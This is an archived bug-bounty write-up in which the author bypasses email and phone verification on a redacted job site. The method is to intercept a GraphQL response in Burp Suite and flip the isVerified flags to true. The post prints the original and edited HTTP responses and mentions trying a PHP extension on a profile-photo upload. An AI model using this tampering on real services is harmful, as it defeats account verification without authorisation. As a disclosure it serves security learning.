# Authentication Bypass Email and Number Verify

- **Source URL:** https://medium.com/@GemiIang/authentication-bypass-email-and-number-verify-19dd80a4bb3f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126144745/https://medium.com/@GemiIang/authentication-bypass-email-and-number-verify-19dd80a4bb3f
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2524 (id 2524)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Authentication Bypass Email and Number Verify

hi all.

I will share my experience of finding an interesting bug here. I recently found a bug that can bypass the verification process by manipulating the response in graphql. I will hide the company name, because it is a private programme and replace it as redacted.com

at first i tried to find the idor bug, but i didn’t find anything. then i tried to find the exposure sensitive information bug via exifmetada, and boom! i found it. then i started playing around with the image exsitency. when uploading an account profile photo, i changed the exsitency to php and got a response such asHTTP/2 200 OK

Date: Sun, 30 Apr 2023 13:04:28 GMT

Content-Type: application/json; charset=utf-8

Vary: Origin,accept-encoding

Access-Control-Allow-Origin: https://redacted.com

X-Ratelimit-Remaining: 19

X-Ratelimit-Reset: 1682859869

X-Ratelimit-Limit: 20

X-Response-Time: 70.067ms

Strict-Transport-Security: max-age=15724800; includeSubDomains

X-Frame-Options: SAMEORIGIN

X-Download-Options: noopen

X-Content-Type-Options: nosniff

Referrer-Policy: strict-origin-when-cross-origin

Cache-Control: no-cache

Cf-Cache-Status: DYNAMIC

Report-To: {"endpoints":\[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=TF7I8kl9%2BFfPtafRz%2BiDz0Jo3EvcynF4Uc7cEMqJdnIuYdCSuA27WA9NLhkSr4GPtS3P2NeA0cvU0ea9uyJPxsOek3W671Sm%2FDooXV6hzGt58bGl38GRkC%2BHi4g%3D"}\],"group":"cf-nel","max\_age":604800}

Nel: {"success\_fraction":0,"report\_to":"cf-nel","max\_age":604800}

Server: cloudflare

Cf-Ray: 7bfffda2490c3fab-SIN

Alt-Svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400

"data":{"email":"my@email.com","isVerified":false,"firstName":"test1","lastName":"testt","phone":"+22123312721","isPhoneNumberVerified":false,"birthDate":null,"preferredLanguage":"id","intro":null,"profilePic":"e115f9e70d887e81fc639d47b265a645.png","age":null,"slug":null,"ugcFullName":"test testt","id":"20487eac-24b7-437b-8d3c-4a6be5fa2c2a","emailVerificationTokenExpiry":"2023-05-02","metadata":{"employerMarketingParams":{}},"preferences":null,"phoneNumberVerificationTokenExpiry":"2023-04-30T09:30:29.356Z","lastSeen":"2023-04-30T13:03:51.972Z","resume":null,"portfolio":null,"role":"CANDIDATE","companyRole":null,"gender":"PREFER\_NOT\_TO\_SHARE","race":null,"residentialStatus":null,"isEmployed":null,"isPublic":false,"shadowBanned":false,"banNote":null,"BanningOperatorId":null,"bannedAt":null,"CityId":28904,"CountryCode":"ID","Nationality":null,"candidateStatusExpiryMonth":null,"candidateStatusExpiryYear":null,"workDurationInMonths":0,"createdAt":"2023-04-30T09:30:29.421Z","updatedAt":"2023-04-30T13:04:28.566Z","links":{}},"count":0,"isAuthenticated":true}

then I change the isverified parameter to true which was previously false.

```
HTTP/2 200 OK
Date: Sun, 30 Apr 2023 13:04:28 GMT
Content-Type: application/json; charset=utf-8
Vary: Origin,accept-encoding
Access-Control-Allow-Origin: https://redacted.com
X-Ratelimit-Remaining: 19
X-Ratelimit-Reset: 1682859869
X-Ratelimit-Limit: 20
X-Response-Time: 70.067ms
Strict-Transport-Security: max-age=15724800; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Cache-Control: no-cache
Cf-Cache-Status: DYNAMIC
Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
Cf-Ray: 7bfffda2490c3fab-SIN
Alt-Svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
"data":{"email":"my@email.com","isVerified":true,"firstName":"test1","lastName":"testt","phone":"+22123312721","isPhoneNumberVerified":true,"birthDate":null,"preferredLanguage":"id","intro":null,"profilePic":"e115f9e70d887e81fc639d47b265a645.png","age":null,"slug":null,"ugcFullName":"test testt","id":"20487eac-24b7-437b-8d3c-4a6be5fa2c2a","emailVerificationTokenExpiry":"2023-05-02","metadata":{"employerMarketingParams":{}},"preferences":null,"phoneNumberVerificationTokenExpiry":"2023-04-30T09:30:29.356Z","lastSeen":"2023-04-30T13:03:51.972Z","resume":null,"portfolio":null,"role":"CANDIDATE","companyRole":null,"gender":"PREFER_NOT_TO_SHARE","race":null,"residentialStatus":null,"isEmployed":null,"isPublic":false,"shadowBanned":false,"banNote":null,"BanningOperatorId":null,"bannedAt":null,"CityId":28904,"CountryCode":"ID","Nationality":null,"candidateStatusExpiryMonth":null,"candidateStatusExpiryYear":null,"workDurationInMonths":0,"createdAt":"2023-04-30T09:30:29.421Z","updatedAt":"2023-04-30T13:04:28.566Z","links":{}},"count":0,"isAuthenticated":true}
```
then click forwad on burpsuite and the email is verified.

maybe that’s all I can share today. I will write again if there are interesting findings again.
